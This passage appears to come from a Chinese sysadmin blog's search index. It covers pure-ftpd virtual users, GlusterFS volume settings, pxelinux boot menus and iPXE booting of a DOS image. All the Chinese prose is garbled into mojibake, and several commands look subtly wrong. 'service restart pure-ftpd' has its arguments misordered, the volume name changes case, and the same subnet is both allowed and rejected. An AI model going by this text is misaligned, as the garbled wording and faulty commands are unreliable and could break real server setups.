ä¸ªç”¨æˆ·ï¼Œæ³¨æ„è¯­æ³•ï¼Œtestæ˜¯è™šæ‹Ÿç”¨æˆ·åï¼Œ-uå’Œ-gæ˜¯è™šæ‹Ÿç”¨æˆ·å¯¹åº”linuxç³»ç»Ÿçš„ç³»ç»Ÿç”¨æˆ·ï¼Œå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ­¥å»ºç«‹çš„é‚£ä¸ªæ— ç™»é™†æƒçš„ftpuserï¼Œ-dæ˜¯homeç›®å½•ï¼Œè¿™ä¸ªä¸ç”¨å»ºï¼Œç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†çš„æ—¶å€™pure-ftpdä¼šè‡ªåŠ¨å»ºç«‹ï¼š\npure-pw useradd test -u ftpuser -g ftpuser -d /var/www/ppp é‡å»ºhash\npure-pw mkdb é‡å¯pure-ftpd\nservice restart pure-ftpd okï¼Œæå®šäº†ï¼Œä¸€å®šè¦æ³¨æ„uidçš„é—®é¢˜ã€‚å…¶ä»–æ— å¤æ‚çš„åœ°æ–¹ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-pure-ftpd/","summary":"\u003cp\u003eç”¨è¿‡proftpdå’Œvs-ftpdï¼Œproftpdæœ‰å·¨ææ€–çš„sftpç»†ç²’åº¦æ§åˆ¶ï¼Œç‰¹æ®Šåœºåˆéå¸¸å¥½ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯æ€»è§‰å¾—éƒ½å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬æ–‡ä»¶ç³»ç»Ÿçš„åº•å±‚æ˜¯GlusterFSï¼Œåœ¨ä¹‹ä¸Šå»ºç«‹è™šç”¨æˆ·ï¼Œç”¨proftpdå’Œvs-ftpdéƒ½æ„Ÿè§‰å¤æ‚ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥ä¸€ç›´åœ¨æ‰¾ç®€å•çš„æ–¹æ³•ï¼Œæœ€åå‘ç°äº†pure-ftpdï¼Œå¾ˆç®€å•ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå»ºä¸€ä¸ªæ— ä»»ä½•ç™»é™†æƒçš„æ–°ç”¨æˆ·ï¼Œæ³¨æ„ï¼Œuidå¿…é¡»åœ¨500ä»¥ä¸Šï¼Œä¸èƒ½ç”¨ç³»ç»Ÿç¼ºçœçš„ç”¨æˆ·ftpï¼Œåé¢æ”¹pure-ftpd.confæ—¶ä¼šæœ‰è¯´æ˜ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euseradd -u1000  -U -s/sbin/nologin -M ftpuser  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…pure-ftpd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install pure-ftpd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®æ”¹é…ç½®ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/pure-ftpd/pure-ftpd.conf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eChrootEveryone              yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAnonymousOnly               no  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNoAnonymous                 yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePureDB                      /etc/pure-ftpd/pureftpd.pdb  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#PAMAuthentication          yes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUnixAuthentication          yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ³¨æ„ï¼Œè¿™é‡Œå°±æŒ‡å‡ºäº†æœ€å°uidï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å»ºç«‹ç”¨æˆ·çš„æ—¶å€™uidä¸èƒ½å°äº500ï¼Œå¦åˆ™pure-ftpdæ— æ³•è®¤è¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMinUID                      \u003cspan class=\"m\"\u003e500\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCreateHomeDir               yes  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ”¹å®Œåï¼Œæˆ‘ä»¬æ¥å¢åŠ ä¸ªç”¨æˆ·ï¼Œæ³¨æ„è¯­æ³•ï¼Œtestæ˜¯è™šæ‹Ÿç”¨æˆ·åï¼Œ-uå’Œ-gæ˜¯è™šæ‹Ÿç”¨æˆ·å¯¹åº”linuxç³»ç»Ÿçš„ç³»ç»Ÿç”¨æˆ·ï¼Œå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ­¥å»ºç«‹çš„é‚£ä¸ªæ— ç™»é™†æƒçš„ftpuserï¼Œ-dæ˜¯homeç›®å½•ï¼Œè¿™ä¸ªä¸ç”¨å»ºï¼Œç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†çš„æ—¶å€™pure-ftpdä¼šè‡ªåŠ¨å»ºç«‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epure-pw useradd \u003cspan class=\"nb\"\u003etest\u003c/span\u003e -u ftpuser -g ftpuser -d /var/www/ppp  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡å»ºhash\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epure-pw mkdb  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡å¯pure-ftpd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice restart pure-ftpd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œæå®šäº†ï¼Œä¸€å®šè¦æ³¨æ„uidçš„é—®é¢˜ã€‚å…¶ä»–æ— å¤æ‚çš„åœ°æ–¹ã€‚\u003c/p\u003e","title":"Linuxä¸‹virtual FTPçš„æ­å»ºpure-ftpd"},{"content":"åŸºæœ¬ä¸Šæ­å»ºglusterfséƒ½æ˜¯ç”¨äº†2ä¸ªå‰¯æœ¬ï¼Œç”¨æ¥ä¿è¯æ•°æ®å†—ä½™\nå»ºç«‹æ–°å·ï¼Œ/export/test-volç›®å½•ä¸ç”¨äº‹å…ˆå»ºç«‹ï¼Œä¼šè‡ªåŠ¨å»ºç«‹çš„ï¼š\ngluster volume create test-vol replica 2 transport tcp 172.16.8.5:/export/test-vol/ 172.16.8.6:/export/test-vol/ å¦‚ä¸Šå»ºç«‹æ–°å·åï¼Œtest-volçš„å±ä¸»æ˜¯rootï¼Œå¦‚æœæˆ‘ä»¬æƒ³åŸºäºgfsä¹‹ä¸Šåšä¸ªè™šæ‹Ÿçš„vsftpdï¼Œå»ºè®¾ç”¨æˆ·æ˜¯virtual.virtualï¼Œ500.500\nè®¾ç½®å·uid/gidå±æ€§ï¼š\ngluster volume set test-vol storage.owner-uid 500 gluster volume set test-vol storage.owner-gid 500 è®¾ç½®å·çš„quotaç©ºé—´é…é¢ï¼š\ngluster volume quota test-vol enable gluster volume quota test-vol limit-usage / 10GB gluster volume quota test-vol limit-usage /path/in/volume 2G gluster volume set test-vol features.quota-timeout 30 gluster volume quota test-vol list gluster volume quota test-vol list /path/in/volume å»æ‰quotaé™åˆ¶ï¼š\ngluster volume quota test-vol remove / gluster volume quota test-Vol remove /path/in/volume ä¼˜åŒ–tcpå‚æ•°ï¼š\ngluster volume set test-vol diagnostics.brick-log-level WARNING gluster volume set test-vol diagnostics.client-log-level WARNING gluster volume set test-vol nfs.enable-ino32 on gluster volume set test-vol nfs.addr-namelookup off gluster volume set test-vol nfs.disable on gluster volume set test-vol performance.cache-max-file-size 2MB gluster volume set test-vol performance.cache-refresh-timeout 4 gluster volume set test-vol performance.cache-size 256MB gluster volume set test-vol performance.write-behind-window-size 4M gluster volume set test-vol performance.io-thread-count 32 è®¾ç½®å·è®¿é—®æƒé™\ngluster volume set test-vol auth.allow 192.168.2.* gluster volume set test-vol auth.reject 192.168.2.* ç›‘æ§\ngluster volume profile zfws-vol start gluster volume profile zfws-vol info ","permalink":"https://rendoumi.com/posts/20240118-gfs/","summary":"\u003cp\u003eåŸºæœ¬ä¸Šæ­å»º\u003ccode\u003eglusterfs\u003c/code\u003eéƒ½æ˜¯ç”¨äº†2ä¸ªå‰¯æœ¬ï¼Œç”¨æ¥ä¿è¯æ•°æ®å†—ä½™\u003c/p\u003e\n\u003cp\u003eå»ºç«‹æ–°å·ï¼Œ/export/test-volç›®å½•ä¸ç”¨äº‹å…ˆå»ºç«‹ï¼Œä¼šè‡ªåŠ¨å»ºç«‹çš„ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume create test-vol replica \u003cspan class=\"m\"\u003e2\u003c/span\u003e transport tcp 172.16.8.5:/export/test-vol/ 172.16.8.6:/export/test-vol/  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚ä¸Šå»ºç«‹æ–°å·åï¼Œtest-volçš„å±ä¸»æ˜¯rootï¼Œå¦‚æœæˆ‘ä»¬æƒ³åŸºäºgfsä¹‹ä¸Šåšä¸ªè™šæ‹Ÿçš„vsftpdï¼Œå»ºè®¾ç”¨æˆ·æ˜¯virtual.virtualï¼Œ500.500\u003c/p\u003e\n\u003cp\u003eè®¾ç½®å·uid/gidå±æ€§ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol storage.owner-uid \u003cspan class=\"m\"\u003e500\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol storage.owner-gid \u003cspan class=\"m\"\u003e500\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®¾ç½®å·çš„quotaç©ºé—´é…é¢ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol limit-usage / 10GB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol limit-usage /path/in/volume 2G  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol features.quota-timeout \u003cspan class=\"m\"\u003e30\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol list  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol list /path/in/volume  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå»æ‰quotaé™åˆ¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol remove /  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-Vol remove /path/in/volume  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¼˜åŒ–tcpå‚æ•°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol diagnostics.brick-log-level WARNING  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol diagnostics.client-log-level WARNING  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol nfs.enable-ino32 on  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol nfs.addr-namelookup off  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol nfs.disable on  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.cache-max-file-size 2MB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.cache-refresh-timeout \u003cspan class=\"m\"\u003e4\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.cache-size 256MB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.write-behind-window-size 4M  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.io-thread-count \u003cspan class=\"m\"\u003e32\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®¾ç½®å·è®¿é—®æƒé™\u003c/p\u003e","title":"GlusterFSçš„æ—¥å¸¸åº”ç”¨"},{"content":"åœ¨åšpxelinuxå¯åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…çš„ä¼šç”¨åˆ°èœå•é€‰é¡¹ã€‚æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œmenu.c32 å’Œ vesamenu.c32ã€‚\næ•ˆæœå¦‚ä¸‹ï¼š menu.c32 vesamenu.c32 åŒºåˆ«å°±æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š\ndefault vesamenu.c32 PROMPT 0 NOESCAPE 0 ALLOWOPTIONS 0 TIMEOUT 200 MENU TITLE Boot Menu LABEL Ghost_Client_UNDI MENU LABEL ^1. Ghost Client UNDI MENU DEFAULT kernel memdisk append keeppxe initrd=imz/Client_undi.imz LABEL Ghost_Client_NDIS MENU LABEL ^2. Ghost Client NDIS kernel memdisk APPEND keeppxe initrd=imz/Client_ndis.IMZ LABEL WinPE MENU LABEL ^3. WinPE 2.0 KERNEL boot/pxeboot.0 LABEL PartedMagic MENU LABEL ^4. Parted Magic kernel utils/pmagic/bzImage LABEL Local_Drive MENU LABEL ^5. Boot Local Drive # localboot 0 KERNEL chain.c32 APPEND hd0 0 åŒºåˆ«å°±æ˜¯ç¬¬ä¸€è¡Œ:\nmenu.c32 æ˜¯ UI menu.c32\nvesamenu.c32 æ˜¯ default vesamenu.c32\nä¸ªäººè¿˜æ˜¯è§‰å¾—menu.c32æ¯”è¾ƒå¥½ï¼Œä¹ æƒ¯äº†è¿™ç§è“è‰²ã€‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚æœæƒ³æŠŠpxelinux.0ã€menu.c32ã€vesamenu.c32éƒ½æ‰”åˆ°/ks/pxelinuxçš„å­ç›®å½•ä¸‹ï¼Œè€Œä¸æ˜¯æ‰”åœ¨/ksçš„æ ¹ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆé…ä¸€ä¸‹dnsmasqçš„209å’Œ210å³å¯ï¼Œçœ‹ä¸€ä¸‹boot2.phpæ–‡ä»¶ï¼š\ncase \u0026#39;\\52:54:00:7f:65:bb\u0026#39;: echo \u0026#34;set 209:string vesamenu.conf\\n\u0026#34;; echo \u0026#34;set 210:string http://172.16.8.1/ks/pxelinux/\\n\u0026#34;; echo \u0026#34;chain http://172.16.8.1/ks/pxelinux/pxelinux.0\\n\u0026#34;; break; ","permalink":"https://rendoumi.com/posts/20240118-ipxe_menu/","summary":"\u003cp\u003eåœ¨åšpxelinuxå¯åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…çš„ä¼šç”¨åˆ°èœå•é€‰é¡¹ã€‚æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œmenu.c32 å’Œ vesamenu.c32ã€‚\u003c/p\u003e\n\u003cp\u003eæ•ˆæœå¦‚ä¸‹ï¼š menu.c32\n\u003cimg alt=\"image-20240118172119725\" loading=\"lazy\" src=\"/posts/20240118-ipxe_menu/image-20240118172119725.png\"\u003e\u003c/p\u003e\n\u003cp\u003evesamenu.c32\n\u003cimg alt=\"image-20240118172137015\" loading=\"lazy\" src=\"/posts/20240118-ipxe_menu/image-20240118172137015.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåŒºåˆ«å°±æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefault vesamenu.c32  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePROMPT \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNOESCAPE \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eALLOWOPTIONS \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTIMEOUT \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMENU TITLE Boot Menu\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL Ghost_Client_UNDI  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^1. Ghost Client UNDI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU DEFAULT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kernel memdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  append keeppxe \u003cspan class=\"nv\"\u003einitrd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eimz/Client_undi.imz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL Ghost_Client_NDIS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^2. Ghost Client NDIS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kernel memdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  APPEND keeppxe \u003cspan class=\"nv\"\u003einitrd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eimz/Client_ndis.IMZ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL WinPE  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^3. WinPE 2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  KERNEL boot/pxeboot.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL PartedMagic  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^4. Parted Magic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kernel utils/pmagic/bzImage\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL Local_Drive  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e MENU LABEL ^5. Boot Local Drive\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"c1\"\u003e#  localboot 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e KERNEL chain.c32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e APPEND hd0 \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåŒºåˆ«å°±æ˜¯ç¬¬ä¸€è¡Œ:\u003c/p\u003e","title":"ipxeä¸­menu.c32å’Œvesamenu.c32çš„ç”¨æ³•"},{"content":"å¤ªå¤è€çš„å‘½é¢˜äº†ï¼Œå¦‚æœæƒ³ç©Dos 6.22ä¹‹ä¸‹çš„æ¸¸æˆï¼Œé‚£å°±éœ€è¦å¼•åŠ¨ä¸€ä¸ªDosç³»ç»Ÿäº†ã€‚\nç³»ç»Ÿæ–‡ä»¶å€’æ˜¯ç°æˆçš„ï¼ŒDos6.22.imgã€‚\nå¦‚ä½•åšä¸ªipxeçš„å¯åŠ¨å‘¢ï¼Ÿ\nç®€å•ï¼Œä¾æ ·ç”»è‘«èŠ¦ï¼Œä¿®æ”¹boot2.php\ncase \u0026#39;\\52:54:00:7f:65:bb\u0026#39;: echo \u0026#34;initrd http://172.16.8.1/ks/dos/Dos6.22.img\\n\u0026#34;; echo \u0026#34;chain http://172.16.8.1/ks/dos/memdisk\\n\u0026#34;; break; memdiskæ˜¯ä»syslinuxä¸­æ‹·è´çš„ï¼Œä¹Ÿæ˜¯ç¥å™¨ã€‚\nå…¶å®å¯ä»¥ç”¨sanbootæ¥å¯åŠ¨çš„ï¼Œä½†æ˜¯é‚£æ ·èµ·åŠ¨èµ·æ¥çš„ç³»ç»Ÿå¯¹Cç›˜æ— å†™æƒé™ï¼Œå› ä¸ºdosä¸‹æ²¡æœ‰sançš„é©±åŠ¨å¯ç”¨ã€‚\næ‰€ä»¥æ”¹ç”¨memdiskï¼Œè¿™æ ·æƒé™å˜ä¸ºå¯å†™çš„äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_dos/","summary":"\u003cp\u003eå¤ªå¤è€çš„å‘½é¢˜äº†ï¼Œå¦‚æœæƒ³ç©Dos 6.22ä¹‹ä¸‹çš„æ¸¸æˆï¼Œé‚£å°±éœ€è¦å¼•åŠ¨ä¸€ä¸ªDosç³»ç»Ÿäº†ã€‚\u003c/p\u003e\n\u003cp\u003eç³»ç»Ÿæ–‡ä»¶å€’æ˜¯ç°æˆçš„ï¼ŒDos6.22.imgã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•åšä¸ªipxeçš„å¯åŠ¨å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç®€å•ï¼Œä¾æ ·ç”»è‘«èŠ¦ï¼Œä¿®æ”¹boot2.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:7f:65:bb\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd http://172.16.8.1/ks/dos/Dos6.22.img\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;chain http://172.16.8.1/ks/dos/memdisk\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan 